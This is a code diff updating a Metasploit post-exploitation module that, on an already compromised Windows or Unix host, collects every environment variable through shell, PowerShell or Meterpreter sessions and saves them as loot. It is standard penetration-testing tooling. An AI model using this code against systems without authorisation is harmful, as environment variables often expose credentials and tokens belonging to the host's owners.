@@ -1,71 +1,100 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-
 class MetasploitModule < Msf::Post
-
   include Msf::Post::Windows::Registry
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Multi Gather Generic Operating System Environment Settings',
-      'Description'   => %q{ This module prints out the operating system environment variables },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>', 'egypt' ],
-      'Platform'      => %w{ linux win },
-      'SessionTypes'  => [ 'shell', 'meterpreter' ]
-    ))
-    @ltype = 'generic.environment'
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Multi Gather Generic Operating System Environment Settings',
+        'Description' => %q{ This module prints out the operating system environment variables. },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>', 'egypt' ],
+        'Platform' => %w[linux win unix],
+        'SessionTypes' => %w[powershell shell meterpreter],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [],
+          'SideEffects' => []
+        },
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_sys_config_getenv
+              stdapi_sys_process_execute
+            ]
+          }
+        }
+      )
+    )
   end
 
   def run
-    case session.type
-    when "shell"
-      get_env_shell
-    when "meterpreter"
-      get_env_meterpreter
+    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
+    print_status("Running module against #{hostname} (#{session.session_host})")
+
+    output = case session.type
+             when 'shell'
+               get_env_shell
+             when 'powershell'
+               get_env_powershell
+             when 'meterpreter'
+               get_env_meterpreter
+             end
+
+    fail_with(Failure::Unknown, 'Could not retrieve environment variables') if output.blank?
+
+    if session.platform == 'windows'
+      ltype = 'windows.environment'
+    else
+      ltype = 'unix.environment'
     end
-    store_loot(@ltype, "text/plain", session, @output) if @output
-    print_line @output if @output
+
+    print_line(output)
+    path = store_loot(ltype, 'text/plain', session, output)
+    print_good("Results saved to #{path}")
   end
 
   def get_env_shell
-    print_line @output if @output
-    if session.platform =~ /win/
-      @ltype = "windows.environment"
-      cmd = "set"
-    else
-      @ltype = "unix.environment"
-      cmd = "env"
+    cmd = session.platform == 'windows' ? 'set' : 'env'
+    cmd_exec(cmd)
+  end
+
+  def get_env_powershell
+    res = cmd_exec('Get-ChildItem Env: | ConvertTo-Csv')
+
+    output = []
+    csv = CSV.parse(res, skip_lines: /^#/, headers: true)
+    csv.each do |row|
+      output << "#{row['Key']}=#{row['Value']}"
     end
-    @output = cmd_exec(cmd)
+
+    return output.join("\n")
   end
 
   def get_env_meterpreter
-    case sysinfo["OS"]
-    when /windows/i
+    case session.platform
+    when 'windows'
       var_names = []
-      var_names << registry_enumvals("HKEY_CURRENT_USER\\Volatile Environment")
-      var_names << registry_enumvals("HKEY_CURRENT_USER\\Environment")
-      var_names << registry_enumvals("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment")
-      output = []
+      var_names << registry_enumvals('HKEY_CURRENT_USER\\Volatile Environment')
+      var_names << registry_enumvals('HKEY_CURRENT_USER\\Environment')
+      var_names << registry_enumvals('HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment')
       var_names.delete(nil)
+
+      output = []
       session.sys.config.getenvs(*var_names.flatten.uniq.sort).each do |k, v|
         output << "#{k}=#{v}"
       end
-      @output = output.join("\n")
-      @ltype = "windows.environment"
+      return output.join("\n")
     else
       # Don't know what it is, hope it's unix
-      print_status sysinfo["OS"]
-      chan = session.sys.process.execute("/bin/sh", "-c env", {"Channelized" => true})
-      @output = chan.read
-      @ltype = "unix.environment"
+      print_status("Executing 'env' on #{sysinfo['OS']}")
+      chan = session.sys.process.execute('/bin/sh', '-c env', { 'Channelized' => true })
+      return chan.read
     end
   end
-
 end
